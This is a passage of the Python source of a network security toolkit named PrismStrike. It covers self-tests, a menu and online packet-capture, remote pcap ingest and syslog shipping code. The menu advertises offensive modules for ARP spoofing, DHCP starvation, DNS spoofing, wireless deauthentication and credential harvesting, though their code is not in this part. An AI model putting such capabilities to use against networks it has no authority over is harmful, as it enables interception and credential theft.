        assert set(parsed) == {"lo0", "en0"},             "the netstat parser reported the wrong interfaces: %s" % sorted(parsed)
        assert parsed["en0"]["rx_bytes"] == 400000 and parsed["en0"]["tx_bytes"] == 300000,             "netstat byte counters were misread: %s" % parsed["en0"]
        assert parsed["en0"]["tx_errors"] == 2, "the netstat error column was misread"
        assert parsed["en0"]["rx_packets"] == 900, "the netstat packet column was misread"
        assert parsed["lo0"]["rx_bytes"] == 1234567,             "a continuation row overrode the first complete row for lo0"
        assert _parse_netstat_output("") == {}, "empty netstat output must parse to nothing"
        windows_fixture = ('[{"Name": "Ethernet 2", "ReceivedBytes": 111, "SentBytes": 222}, '
                           '{"Name": "Wi-Fi", "ReceivedBytes": 333, "SentBytes": 444}]')
        parsed_windows = _parse_windows_adapter_stats(windows_fixture)
        assert parsed_windows["Wi-Fi"]["rx_bytes"] == 333, "Windows adapter counters were misread"
        assert parsed_windows["Ethernet 2"]["tx_bytes"] == 222, "Windows adapter counters were misread"
        single_object = '{"Name": "Ethernet", "ReceivedBytes": 5, "SentBytes": 6}'
        assert _parse_windows_adapter_stats(single_object)["Ethernet"]["rx_bytes"] == 5,             "a single adapter object must parse like an array of one"
        assert _parse_windows_adapter_stats("not json") == {}, "invalid JSON must parse to nothing"
        backend_name, backend_note = _counter_backend(sample_path="/nonexistent/proc/net/dev")
        assert backend_name in ("proc", "netstat", "powershell", "scapy", "none"),             "unknown backend name %r" % backend_name
        assert backend_note, "a backend must describe itself"
        degraded = throughput_sampler(duration=0.6, interval=0.3,
                                      sample_path="/nonexistent/proc/net/dev")
        assert isinstance(degraded, dict), "the sampler must always return a summary"
        assert degraded.get("mode") == "throughput-sampler", "unexpected sampler summary shape"
        assert degraded.get("available") or degraded.get("reason"),             "an unavailable sampler must explain why"
        if not degraded.get("available"):
            assert degraded["samples"] == [] and degraded["averages"] == {},                 "an unavailable sampler must return empty sample tables"
        record("extension: portable throughput backends", "pass",
               "netstat -ibn and PowerShell fixtures parsed exactly; backend probe reports %s; "
               "the sampler degrades to a summary with a reason instead of aborting"
               % backend_name)
    except (AssertionError, FrameworkError) as exc:
        record("extension: portable throughput backends", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: portable throughput backends", "fail", "%s: %s"
               % (type(exc).__name__, exc))



    passes = sum(1 for entry in results if entry["status"] == "pass")
    failures = sum(1 for entry in results if entry["status"] == "fail")
    skips = sum(1 for entry in results if entry["status"] == "skip")
    heading("SELF-TEST SUMMARY")
    kv_table([
        ("Passed", c(passes, "bgreen", "bold")),
        ("Failed", c(failures, "bred", "bold") if failures else "0"),
        ("Skipped", c(skips, "byellow")),
        ("Total", len(results)),
        ("Coverage", "15 platform + 25 extension + 17 online checks (modules 01-18)"),
    ])
    summary = OrderedDict([
        ("mode", "self-test"),
        ("passed", passes), ("failed", failures), ("skipped", skips),
        ("results", results),
        ("environment", Privileges.describe()),
    ])
    artifact = LOGGER.scan("self_test", summary, target="localhost")
    if artifact:
        note("self-test artefact: %s" % artifact)
    if failures == 0:
        ok("self-test completed with no failures.")
    else:
        err("%d self-test failure(s) - review the detail column above." % failures)
    return summary


# ===========================================================================
# MASTER CLI MENU (v3.0 - 17 interactive modules + self-test + exit)
# ===========================================================================
SELF_TEST_MENU_KEY = "12"

MENU_GROUPS: "OrderedDict[str, List[str]]" = OrderedDict([
    ("RECONNAISSANCE & TRAFFIC CRAFTING", ["1", "2", "3", "4", "5", "6", "7", "8"]),
    ("PLATFORM OPERATIONS & DIAGNOSTICS", ["9", "10", "11", "12"]),
    ("EXTENSION SUITE (v%s - NEW)" % __version__, ["13", "14", "15", "16", "17", "18"]),
    ("SESSION", ["0"]),
])

MAIN_MENU_TABLE: "OrderedDict[str, Tuple[str, Any]]" = OrderedDict([
    ("1", ("ICMP reconnaissance (custom ping sweeps + granular probes)", module_icmp_recon)),
    ("2", ("TCP flag crafter (SYN/ACK/FIN/RST/PSH + combinations)", module_tcp_crafter)),
    ("3", ("Hping replicator (raw traffic generation harness)", module_hping)),
    ("4", ("Nmap sub-engine (python-nmap: fast/aggressive/custom)", module_nmap)),
    ("5", ("Live packet sniffer (scapy sniff with live dissection)", module_sniffer)),
    ("6", ("ARP discovery (native op=1 neighbour mapping)", module_arp_discovery)),
    ("7", ("ARP spoofing / MITM (op=2 poisoning + auto-restore)", module_arp_spoof)),
    ("8", ("PCAP analyst (file + live/remote capture forensics)", module_pcap_analyst)),
    ("9", ("System intelligence (local report + remote host dossier)", module_system_intel)),
    ("10", ("Logging console (ledger/artefacts + remote syslog shipping)", module_logging_console)),
    ("11", ("Dependency doctor (audit + online release freshness)", module_dependency_doctor)),
    ("12", ("Run the self-test suite (57 checks)", "self-test")),
    ("13", ("NETWORK UTILITIES - banner grab, TCP reassembly, path MTU, OS fingerprint", module_network_utils)),
    ("14", ("DHCP OPERATIONS - discover, starvation test, authorised rogue server", module_dhcp)),
    ("15", ("DNS TOOLKIT - native resolver, tunnelling monitor, spoof engine", module_dns)),
    ("16", ("WIRELESS LAB - capability audit, monitor-mode scan, deauth lab", module_wireless)),
    ("17", ("AWARENESS LISTENERS - HTTP harvester, protocol credential traps", module_listeners)),
    ("18", ("REPORTING & MAINTENANCE - reports, delivery (webhook/SMTP), pruning, socket map", module_extras)),
    ("0", ("Exit PrismStrike", None)),
])


def _render_menu(dispatch: "OrderedDict[str, Tuple[str, Any]]") -> None:
    """Print the grouped menu exactly once per iteration (keeps the screen readable)."""
    print_banner(compact=True)
    out("  session: %s" % c(LOGGER.session_id, "grey"))
    out("  privilege: %s   ->   %s" % (
        c("root/administrator", "bgreen", "bold") if Privileges.is_root()
        else c("unprivileged (raw modules gated)", "byellow", "bold"),
        c("all raw-socket modules available", "grey") if Privileges.is_root()
        else c("run with sudo for full capability", "grey")))
    grouped_keys = {key for keys in MENU_GROUPS.values() for key in keys}
    for group_label, keys in MENU_GROUPS.items():
        present = [key for key in keys if key in dispatch]
        if not present:
            continue
        out("")
        out("  %s" % c(group_label, "bcyan", "bold"))
        for key in present:
            label, _ = dispatch[key]
            marker = c("[%s]" % key.rjust(2), "byellow", "bold")
            out("    %s %s" % (marker, label))
    leftovers = [key for key in dispatch if key not in grouped_keys]
    if leftovers:
        out("")
        out("  %s" % c("OTHER", "bcyan", "bold"))
        for key in leftovers:
            label, _ = dispatch[key]
            out("    %s %s" % (c("[%s]" % key.rjust(2), "byellow", "bold"), label))
    out("")


def _execute_menu_entry(choice: str, label: str, handler: Any) -> Optional[int]:
    """
    Run one menu selection with the framework's full guard net.

    Returns an exit code when the session should end, otherwise None to keep
    the menu loop running. Input exhaustion always unwinds cleanly.
    """
    if handler == "self-test":
        try:
            run_self_test(include_live=True, include_nmap=True)
        except InputExhausted:
            out("")
            warn("input stream closed during the self-test - ending the session cleanly.")
            return 0
        except Exception as exc:
            err("self-test crashed: %s: %s" % (type(exc).__name__, exc))
            LOGGER.event("error", "self-test crash: %s" % exc, level="CRITICAL",
                         data={"traceback": traceback.format_exc()[-4000:]})
        pause_for_operator()
        return None
    if handler is None:
        return None
    try:
        handler()
    except InputExhausted:
        out("")
        warn("input stream closed - ending the interactive session cleanly.")
        return 0
    except AbortOperation:
        warn("%s aborted." % label)
    except FrameworkError as exc:
        err("%s: %s" % (label, exc))
    except KeyboardInterrupt:
        out("")
        warn("%s interrupted by operator - returning to the menu." % label)
    except Exception as exc:
        err("%s failed: %s: %s" % (label, type(exc).__name__, exc))
        LOGGER.event("error", "%s crash: %s" % (label, exc), level="CRITICAL",
                     data={"traceback": traceback.format_exc()[-4000:]})
    pause_for_operator()
    return None


def main_menu(state: Dict[str, Any]) -> int:
    """Primary interactive loop: safe dispatch into every module."""
    while True:
        _render_menu(MAIN_MENU_TABLE)
        try:
            choice = prompt_text("prismstrike>", default="0")
        except InputExhausted:
            out("")
            warn("standard input closed - ending the interactive session cleanly.")
            LOGGER.event("session", "session ended: input stream closed", level="WARN")
            return 0
        if choice is PROMPT_ABORT:
            choice = "0"
        choice = str(choice).strip()
        if choice == "0":
            try:
                confirmed = prompt_yes_no("Exit PrismStrike and close the session journal?", True)
            except InputExhausted:
                warn("standard input closed during exit confirmation - ending session.")
                return 0
            if confirmed:
                return 0
            LOGGER.event("ui", "exit cancelled by operator")
            continue
        entry = MAIN_MENU_TABLE.get(choice)
        if entry is None:
            warn("'%s' is not a menu option - pick 0-18." % choice)
            continue
        label, handler = entry
        LOGGER.event("module_start", "menu option %s -> %s" % (choice, label))
        exit_code = _execute_menu_entry(choice, label, handler)
        if exit_code is not None:
            return exit_code


# ===========================================================================
# ONLINE OPERATIONS LAYER (v3.1.0)
#
# Converts every formerly file/local-only capability into a networked mode:
#   08  PCAP analyst .... live capture analysis, remote capture ingest (HTTP/S),
#                        rolling stream analysis
#   09  System intel .... remote host dossier (DNS/PTR, route, ICMP RTT, ports)
#   10  Logging console . RFC5424 syslog shipping to a remote collector
#   11  Dependency doctor online freshness audit against the PyPI release API
#   18  Reporting ....... webhook push (HTTP/S multipart) + SMTP/STARTTLS email
#
# Offline modes remain available for air-gapped work; every online path reports
# its artefact and degrades to a clear error instead of a traceback.
# ===========================================================================
import hashlib
import mimetypes
import queue as _queue
import smtplib
import ssl
import urllib.error
import urllib.parse
import urllib.request
from email.message import EmailMessage
from email.utils import formatdate as _email_formatdate, make_msgid as _email_make_msgid

DEFAULT_USER_AGENT = "PrismStrike/%s (%s; online-operations)" % (__version__, __framework__)
CAPTURE_MAGIC = (
    b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4",      # classic pcap, both endians
    b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d",      # nanosecond-resolution pcap
    b"\x0a\x0d\x0d\x0a",                            # pcapng section header block
)


def looks_like_capture(head: bytes) -> bool:
    """True when the first bytes match a pcap/pcapng magic number."""
    if not head or len(head) < 4:
        return False
    return any(head.startswith(magic) for magic in CAPTURE_MAGIC)


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Return the 3xx response to the caller instead of following it."""

    def redirect_request(self, req: Any, fp: Any, code: int, msg: str, headers: Any,
                         newurl: str) -> Any:
        return None


_NO_REDIRECT_OPENER = urllib.request.build_opener(_NoRedirectHandler)


def _http_request(url: str, data: Optional[bytes] = None, headers: Optional[Dict[str, str]] = None,
                  timeout: float = 20.0, method: Optional[str] = None,
                  no_redirect: bool = False, allow_error: bool = False) -> Any:
    """
    Single urllib entry point: adds the framework user-agent, enforces http(s),
    and translates every network failure into a FrameworkError with context.
    """
    spec = str(url).strip()
    if not spec:
        raise FrameworkError("no URL supplied")
    if not re.match(r"^https?://", spec, re.I):
        raise FrameworkError("unsupported URL scheme in '%s' (use http:// or https://)" % spec)
    request_headers = {"User-Agent": DEFAULT_USER_AGENT, "Accept": "*/*"}
    request_headers.update(headers or {})
    request = urllib.request.Request(spec, data=data, headers=request_headers, method=method)
    opener = _NO_REDIRECT_OPENER.open if no_redirect else urllib.request.urlopen
    try:
        return opener(request, timeout=max(1.0, float(timeout)))
    except urllib.error.HTTPError as exc:
        if allow_error:
            raise
        raise FrameworkError("HTTP %s from %s: %s" % (exc.code, spec, exc.reason))
    except urllib.error.URLError as exc:
        raise FrameworkError("connection to %s failed: %s" % (spec, exc.reason))
    except (OSError, ValueError) as exc:
        raise FrameworkError("%s: %s" % (type(exc).__name__, exc))


def _http_json(url: str, timeout: float = 10.0,
               headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """GET a JSON document with the framework user-agent and optional headers."""
    response = _http_request(url, headers=headers, timeout=timeout)
    try:
        with response:
            payload = response.read(4 * 1024 * 1024)
        return json.loads(payload.decode("utf-8", "replace"))
    except (ValueError, OSError, UnicodeDecodeError) as exc:
        raise FrameworkError("invalid JSON from %s: %s" % (url, exc))


# ---------------------------------------------------------------------------
# 08 - ONLINE PCAP WORKFLOWS
# ---------------------------------------------------------------------------
def online_capture_analyse(iface: Optional[str] = None, duration: float = 20.0, bpf: str = "",
                           max_packets: int = 50000, save_pcap: bool = True) -> Dict[str, Any]:
    """
    Capture live traffic and immediately analyse it with the offline engine.

    This is the online counterpart of menu 08 option 1: the same forensics pass
    (conversations, protocol mix, DNS, credentials) now runs over a live feed.
    """
    if not require_scapy("live capture analysis"):
        raise FrameworkError("scapy unavailable")
    if not Privileges.raw_socket_available():
        raise FrameworkError("live capture requires root/administrator authority (euid=%s)"
                             % Privileges.euid())
    duration = max(1.0, float(duration))
    max_packets = max(1, int(max_packets))
    note("capturing on %s for %s (filter: %s, cap %d packets)"
         % (iface or "auto", format_duration(duration), bpf or "none", max_packets))
    collected: List[Any] = []
    bpf_filter = bpf.strip() or None

    def _collect(packet: Any) -> None:
        if len(collected) < max_packets:
            collected.append(packet)
            if len(collected) % 250 == 0:
                out("  %s %d packets captured ..." % (c("LIVE", "bgreen", "bold"), len(collected)))

    kwargs: Dict[str, Any] = {"prn": _collect, "store": False, "timeout": duration}
    if bpf_filter:
        kwargs["filter"] = bpf_filter
    if iface:
        kwargs["iface"] = iface
    started = time.time()
    try:
        sniff(**kwargs)
    except KeyboardInterrupt:
        warn("live capture interrupted - analysing what was collected.")
    except OSError as exc:
        raise FrameworkError("capture failed: %s (check interface, filter and privileges)" % exc)
    elapsed = time.time() - started
    pcap_path = ""
    analysis: Dict[str, Any] = {}
    if collected and save_pcap:
        try:
            os.makedirs(LOGGER.artifact_dir, exist_ok=True)
            pcap_path = os.path.join(LOGGER.artifact_dir, "%s_online_capture_%s.pcap"
                                     % (LOGGER.session_id, uuid.uuid4().hex[:6]))
            wrpcap(pcap_path, collected)
        except (OSError, ValueError) as exc:
            warn("capture could not be persisted: %s" % exc)
            pcap_path = ""
    if pcap_path:
        analysis = analyse_pcap(pcap_path)
    heading("ONLINE CAPTURE ANALYSIS")
    kv_table([
        ("Interface", iface or "auto"),
        ("Duration", format_duration(elapsed)),
        ("Packets captured", len(collected)),
        ("Capture rate", "%.1f pkt/s" % (len(collected) / elapsed if elapsed else 0.0)),
        ("Filter", bpf or "none"),
        ("Saved capture", pcap_path or "not persisted"),
    ])
    summary = OrderedDict([
        ("mode", "online-capture-analyse"),
        ("interface", iface or "auto"),
        ("duration_seconds", round(elapsed, 2)),
        ("packets", len(collected)),
        ("filter", bpf),
        ("pcap_path", pcap_path),
        ("analysis", analysis),
    ])
    artifact = LOGGER.scan("online_capture", summary, target=iface or "auto")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def fetch_remote_capture(url: str, dest_dir: str = "", timeout: float = 30.0,
                         max_bytes: int = 64 * 1024 * 1024, headers: Optional[Dict[str, str]] = None,
                         analyse: bool = True, token: str = "") -> Dict[str, Any]:
    """
    Download a capture file from an HTTP(S) endpoint and analyse it.

    Streams with a size ceiling, validates the pcap magic number before saving,
    records status/content-type/bytes/sha256 and hands the file to the offline
    analyst - "offline analysis, online sourcing".
    """
    if not url:
        raise FrameworkError("no capture URL supplied")
    request_headers = dict(headers or {})
    if token:
        request_headers["Authorization"] = "Bearer %s" % token
    out("  %s fetching %s" % (c("ONLINE", "bcyan", "bold"), url))
    started = time.time()
    response = _http_request(url, headers=request_headers, timeout=timeout)
    digest = hashlib.sha256()
    stored_path = ""
    total = 0
    head = b""
    content_type = ""
    status = 0
    declared_length = -1
    transfer_encoding = ""
    truncated = False
    try:
        status = int(getattr(response, "status", 0) or 0)
        content_type = str(response.headers.get("Content-Type", ""))
        transfer_encoding = str(response.headers.get("Transfer-Encoding", "") or "").strip().lower()
        raw_length = str(response.headers.get("Content-Length", "") or "").strip()
        if raw_length.isdigit():
            declared_length = int(raw_length)
        directory = dest_dir or LOGGER.artifact_dir
        os.makedirs(directory, exist_ok=True)
        name_hint = os.path.basename(url.split("?", 1)[0]) or "remote_capture.pcap"
        safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", name_hint)[:80]
        if not safe_name.lower().endswith((".pcap", ".pcapng", ".cap")):
            safe_name += ".pcap"
        stored_path = os.path.join(directory, "%s_fetch_%s_%s"
                                   % (LOGGER.session_id, uuid.uuid4().hex[:6], safe_name))
        with open(stored_path, "wb") as handle:
            while True:
                try:
                    chunk = response.read(64 * 1024)
                except http.client.IncompleteRead as exc:
                    # the peer closed mid-body: keep what arrived, mark it and let the
                    # verification below refuse the transfer
                    partial = getattr(exc, "partial", b"") or b""
                    if partial:
                        handle.write(partial)
                        digest.update(partial)
                        total += len(partial)
                    truncated = True
                    break
                if not chunk:
                    break
                if not head:
                    head = chunk[:8]
                total += len(chunk)
                if total > max_bytes:
                    handle.close()
                    try:
                        os.remove(stored_path)
                    except OSError:
                        pass
                    raise FrameworkError("capture exceeds the %s size ceiling" % format_bytes(max_bytes))
                handle.write(chunk)
                digest.update(chunk)
    except OSError as exc:
        raise FrameworkError("could not store the downloaded capture: %s" % exc)
    finally:
        try:
            response.close()
        except OSError:
            pass
    if declared_length >= 0 and total < declared_length:
        truncated = True
    if truncated:
        try:
            os.remove(stored_path)
        except OSError:
            pass
        raise FrameworkError(
            "remote capture transfer truncated: %d of %s declared byte(s) received%s"
            % (total, declared_length if declared_length >= 0 else "an unknown number of",
               " (chunked transfer ended early)" if transfer_encoding else ""))
    if not looks_like_capture(head):
        try:
            os.remove(stored_path)
        except OSError:
            pass
        raise FrameworkError("the endpoint did not return a capture file "
                             "(magic=%r, content-type=%s) - refusing to analyse it"
                             % (head[:4], content_type or "unknown"))
    elapsed = time.time() - started
    analysis: Dict[str, Any] = {}
    if analyse:
        analysis = analyse_pcap(stored_path)
    heading("REMOTE CAPTURE INGEST")
    kv_table([
        ("URL", url[:70]),
        ("HTTP status", status or "n/a"),
        ("Content type", content_type or "unknown"),
        ("Stored at", stored_path),
        ("Size", format_bytes(total)),
        ("SHA-256", digest.hexdigest()[:32] + "..."),
        ("Transfer time", "%.2fs (%.1f KB/s)"
         % (elapsed, (total / 1024.0) / elapsed if elapsed else 0.0)),
        ("Declared / received", "%s / %s byte(s)"
         % (declared_length if declared_length >= 0 else "unspecified", total)),
        ("Transfer encoding", transfer_encoding or "identity"),
        ("Format validated", "pcap/pcapng magic present"),
    ])
    summary = OrderedDict([
        ("mode", "remote-capture-fetch"),
        ("url", url),
        ("status", status),
        ("content_type", content_type),
        ("path", stored_path),
        ("bytes", total),
        ("sha256", digest.hexdigest()),
        ("transfer_seconds", round(elapsed, 2)),
        ("declared_bytes", declared_length if declared_length >= 0 else None),
        ("received_bytes", total),
        ("transfer_encoding", transfer_encoding or "identity"),
        ("truncated", False),
        ("analysis", analysis),
    ])
    artifact = LOGGER.scan("remote_capture", summary, target=url)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def stream_analyse(iface: Optional[str] = None, duration: float = 60.0, bpf: str = "",
                   interval: float = 5.0, save_pcap: bool = False,
                   max_packets: int = 200000) -> Dict[str, Any]:
    """
    Rolling live analysis: capture while printing per-interval telemetry
    (packet and byte rates, protocol mix, top talkers) instead of waiting for
    the run to finish like a file-based analyst would.
    """
    if not require_scapy("stream analysis"):
        raise FrameworkError("scapy unavailable")
    if not Privileges.raw_socket_available():
        raise FrameworkError("live stream analysis requires root/administrator authority (euid=%s)"
                             % Privileges.euid())
    duration = max(2.0, float(duration))
    interval = max(0.5, float(interval))
    lock = threading.Lock()
    stats: Dict[str, Any] = {
        "packets": 0, "bytes": 0, "protocols": Counter(), "talkers": Counter(),
        "ports": Counter(), "started": time.time(),
    }
    interval_samples: List[Dict[str, Any]] = []
    last_snapshot = {"packets": 0, "bytes": 0, "time": time.time()}
    stop_event = threading.Event()
    collected: List[Any] = []

    def _observe(packet: Any) -> None:
        try:
            size = len(bytes(packet))
        except (TypeError, AttributeError):
            size = 0
        with lock:
            if stats["packets"] >= max_packets:
                return
            stats["packets"] += 1
            stats["bytes"] += size
            try:
                if packet.haslayer(IP):
                    stats["talkers"]["%s -> %s" % (packet[IP].src, packet[IP].dst)] += 1
                if packet.haslayer(TCP):
                    stats["protocols"]["TCP"] += 1
                    stats["ports"]["tcp/%d" % int(packet[TCP].dport)] += 1
                elif packet.haslayer(UDP):
                    stats["protocols"]["UDP"] += 1
                    stats["ports"]["udp/%d" % int(packet[UDP].dport)] += 1
                elif packet.haslayer(ICMP):
                    stats["protocols"]["ICMP"] += 1
                elif packet.haslayer(ARP):
                    stats["protocols"]["ARP"] += 1
                else:
                    stats["protocols"]["OTHER"] += 1
            except (AttributeError, IndexError, TypeError, ValueError):
                stats["protocols"]["OTHER"] += 1
            if save_pcap and len(collected) < max_packets:
                collected.append(packet)

    def _report_loop() -> None:
        while not stop_event.wait(interval):
            now = time.time()
            with lock:
                packets_now = stats["packets"]
                bytes_now = stats["bytes"]
                top_protocol = stats["protocols"].most_common(1)
                top_talker = stats["talkers"].most_common(1)
            window = max(0.001, now - last_snapshot["time"])
            sample = OrderedDict([
                ("at", format_timestamp(now)),
                ("elapsed", round(now - stats["started"], 2)),
                ("packets", packets_now),
                ("packets_per_second", round((packets_now - last_snapshot["packets"]) / window, 1)),
                ("bytes_per_second", round((bytes_now - last_snapshot["bytes"]) / window, 1)),
                ("top_protocol", top_protocol[0][0] if top_protocol else "-"),
                ("top_talker", top_talker[0][0] if top_talker else "-"),
            ])
            interval_samples.append(sample)
            out("  %s %-8s %8.1f pkt/s %10s %-6s %s" % (
                c("STREAM", "bcyan", "bold"),
                format_duration(sample["elapsed"]),
                sample["packets_per_second"],
                format_bytes(sample["bytes_per_second"]) + "/s",
                sample["top_protocol"],
                c(sample["top_talker"][:52], "grey")))
            last_snapshot.update({"packets": packets_now, "bytes": bytes_now, "time": now})

    heading("ROLLING STREAM ANALYSIS")
    kv_table([
        ("Interface", iface or "auto"),
        ("Duration", format_duration(duration)),
        ("Interval", "%.1fs" % interval),
        ("Filter", bpf or "none"),
        ("Packet ceiling", max_packets),
        ("PCAP tee", "enabled" if save_pcap else "disabled"),
    ])
    kwargs: Dict[str, Any] = {"prn": _observe, "store": False, "timeout": duration}
    if bpf.strip():
        kwargs["filter"] = bpf.strip()
    if iface:
        kwargs["iface"] = iface
    reporter = threading.Thread(target=_report_loop, daemon=True)
    reporter.start()
    try:
        sniff(**kwargs)
    except KeyboardInterrupt:
        warn("stream analysis interrupted by operator.")
    except OSError as exc:
        stop_event.set()
        raise FrameworkError("stream capture failed: %s" % exc)
    finally:
        stop_event.set()
        reporter.join(timeout=2)
    with lock:
        totals = OrderedDict([
            ("packets", stats["packets"]),
            ("bytes", stats["bytes"]),
            ("protocols", dict(stats["protocols"])),
            ("top_talkers", stats["talkers"].most_common(10)),
            ("top_ports", stats["ports"].most_common(10)),
        ])
    pcap_path = ""
    if save_pcap and collected:
        try:
            pcap_path = os.path.join(LOGGER.artifact_dir, "%s_stream_%s.pcap"
                                     % (LOGGER.session_id, uuid.uuid4().hex[:6]))
            wrpcap(pcap_path, collected)
        except (OSError, ValueError) as exc:
            warn("stream capture could not be persisted: %s" % exc)
    heading("STREAM ANALYSIS SUMMARY")
    kv_table([
        ("Packets", totals["packets"]),
        ("Volume", format_bytes(totals["bytes"])),
        ("Intervals reported", len(interval_samples)),
        ("Protocols", ", ".join("%s=%d" % item for item in Counter(totals["protocols"]).most_common(6)) or "-"),
        ("PCAP tee", pcap_path or "n/a"),
    ])
    if totals["top_talkers"]:
        out(c("  top conversations", "cyan"))
        for talker, count in totals["top_talkers"]:
            out("    %-52s %6d" % (talker[:52], count))
    summary = OrderedDict([
        ("mode", "stream-analyse"),
        ("interface", iface or "auto"),
        ("duration_seconds", duration),
        ("interval_seconds", interval),
        ("filter", bpf),
        ("totals", totals),
        ("intervals", interval_samples),
        ("pcap_path", pcap_path),
    ])
    artifact = LOGGER.scan("stream_analyse", summary, target=iface or "auto")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def online_capture_analyse_interactive() -> None:
    """Menu wrapper for 08 option 4 - capture live traffic, then analyse it."""
    iface = prompt_text("interface (blank = auto)", default="", allow_blank=True)
    if iface is PROMPT_ABORT:
        return
    duration = prompt_float("capture seconds", 2.0, 3600.0, 20.0)
    if duration is PROMPT_ABORT:
        return
    bpf = prompt_text("BPF filter (blank = none)", default="", allow_blank=True)
    if bpf is PROMPT_ABORT:
        return
    cap = prompt_int("packet ceiling", 1, 1000000, 50000)
    if cap is PROMPT_ABORT:
        return
    try:
        online_capture_analyse(iface=str(iface).strip() or None, duration=float(duration),
                               bpf=str(bpf).strip(), max_packets=int(cap))
    except FrameworkError as exc:
        err(str(exc))


def fetch_remote_capture_interactive() -> None:
    """Menu wrapper for 08 option 5 - download a remote capture and analyse it."""
    url = prompt_text("capture URL (http/https)")
    if url is PROMPT_ABORT:
        return
    token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
    if token is PROMPT_ABORT:
        return
    timeout = prompt_float("transfer timeout seconds", 5.0, 600.0, 30.0)
    if timeout is PROMPT_ABORT:
        return
    dest = prompt_text("destination directory (blank = session artefacts)", default="", allow_blank=True)
    if dest is PROMPT_ABORT:
        return
    try:
        fetch_remote_capture(str(url).strip(), dest_dir=str(dest).strip(),
                             timeout=float(timeout), token=str(token).strip())
    except FrameworkError as exc:
        err(str(exc))


def stream_analyse_interactive() -> None:
    """Menu wrapper for 08 option 6 - rolling live analysis."""
    iface = prompt_text("interface (blank = auto)", default="", allow_blank=True)
    if iface is PROMPT_ABORT:
        return
    duration = prompt_float("analysis seconds", 2.0, 3600.0, 60.0)
    if duration is PROMPT_ABORT:
        return
    interval = prompt_float("report interval seconds", 0.5, 60.0, 5.0)
    if interval is PROMPT_ABORT:
        return
    bpf = prompt_text("BPF filter (blank = none)", default="", allow_blank=True)
    if bpf is PROMPT_ABORT:
        return
    tee = prompt_yes_no("also persist a PCAP of the streamed traffic?", False)
    try:
        stream_analyse(iface=str(iface).strip() or None, duration=float(duration),
                       bpf=str(bpf).strip(), interval=float(interval), save_pcap=tee)
    except FrameworkError as exc:
        err(str(exc))


# ---------------------------------------------------------------------------
# 10 - REMOTE SYSLOG SHIPPING (RFC5424, UDP or TCP, optional TLS)
# ---------------------------------------------------------------------------
SYSLOG_FACILITIES = OrderedDict([
    ("kern", 0), ("user", 1), ("mail", 2), ("daemon", 3), ("auth", 4), ("syslog", 5),
    ("lpr", 6), ("news", 7), ("uucp", 8), ("cron", 9), ("authpriv", 10), ("ftp", 11),
    ("local0", 16), ("local1", 17), ("local2", 18), ("local3", 19),
    ("local4", 20), ("local5", 21), ("local6", 22), ("local7", 23),
])
SYSLOG_SEVERITIES = OrderedDict([
    ("EMERGENCY", 0), ("ALERT", 1), ("CRITICAL", 2), ("ERROR", 3),
    ("WARN", 4), ("NOTICE", 5), ("INFO", 6), ("DEBUG", 7),
])


def parse_syslog_target(spec: str) -> Dict[str, Any]:
    """Parse 'host', 'host:port', 'host/udp', 'host:port/tcp', or IPv6 in brackets."""
    text = str(spec).strip()
    if not text:
        raise FrameworkError("no syslog target supplied")
    protocol = "udp"
    if "/" in text:
        text, _, proto_part = text.rpartition("/")
        proto_part = proto_part.strip().lower()
        if proto_part not in ("udp", "tcp"):
            raise FrameworkError("syslog protocol must be udp or tcp (got '%s')" % proto_part)
        protocol = proto_part
    host = text
    port = 514
    if text.startswith("[") and "]" in text:
        host = text[1:text.index("]")]
        remainder = text[text.index("]") + 1:]
        if remainder.startswith(":") and remainder[1:].isdigit():
            port = int(remainder[1:])
    elif text.count(":") == 1:
        host_part, port_part = text.rsplit(":", 1)
        if port_part.isdigit():
            host = host_part
            port = int(port_part)
    host = host.strip()
    if not host:
        raise FrameworkError("syslog target host is empty")
    if not (1 <= port <= 65535):
        raise FrameworkError("syslog port %d is out of range" % port)
    return OrderedDict([("host", host), ("port", port), ("protocol", protocol)])


class RemoteLogShipper:
    """
    Non-blocking RFC5424 syslog shipper.

    Events are enqueued (never blocking the CLI), a daemon worker performs the
    delivery, and a bounded queue with drop-oldest accounting guarantees that a
    dead collector can never stall or flood the framework. TCP reconnects on
    demand; TLS is available for collectors that require it.
    """

    def __init__(self, host: str, port: int = 514, protocol: str = "udp",
                 facility: str = "local0", app_name: str = "prismstrike", timeout: float = 2.0,
                 use_tls: bool = False, queue_size: int = 8192, hostname: str = "") -> None:
        if protocol.lower() not in ("udp", "tcp"):
            raise FrameworkError("syslog protocol must be udp or tcp")
        self.host = str(host)
        self.port = int(port)
        self.protocol = protocol.lower()
        self.facility = facility if facility in SYSLOG_FACILITIES else "local0"
        self.app_name = str(app_name)[:48] or "prismstrike"
        self.timeout = max(0.2, float(timeout))
        self.use_tls = bool(use_tls)
        self.hostname = (hostname or platform.node() or "unknown")[:255]
        self._queue: "_queue.Queue[Optional[bytes]]" = _queue.Queue(maxsize=max(16, int(queue_size)))
        self._worker: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._sock: Any = None
        self._lock = threading.RLock()
        self.sent = 0
        self.dropped = 0
        self.errors = 0
        self.reconnects = 0
        self.last_error = ""
        self.started_at: Optional[float] = None

    # -- addressing -------------------------------------------------------
    @property
    def severity_default(self) -> int:
        return SYSLOG_SEVERITIES["INFO"]

    def _priority(self, level: str) -> int:
        severity = SYSLOG_SEVERITIES.get(str(level).upper().strip(), SYSLOG_SEVERITIES["INFO"])
        return SYSLOG_FACILITIES[self.facility] * 8 + severity

    def format_line(self, level: str, category: str, message: str) -> bytes:
        """RFC5424: <PRI>1 TIMESTAMP HOST APP PROCID MSGID - MESSAGE"""
        priority = self._priority(level)
        timestamp = _dt.datetime.now().astimezone().strftime("%Y-%m-%dT%H:%M:%S%z")
        msgid = re.sub(r"[^A-Za-z0-9._-]", "-", str(category or "event"))[:32] or "event"
        text = str(message).replace("\r", " ").replace("\n", " ")[:2048]
        return ("<%d>1 %s %s %s %d %s - %s"
                % (priority, timestamp, self.hostname, self.app_name, os.getpid(), msgid, text)
                ).encode("utf-8", "replace")

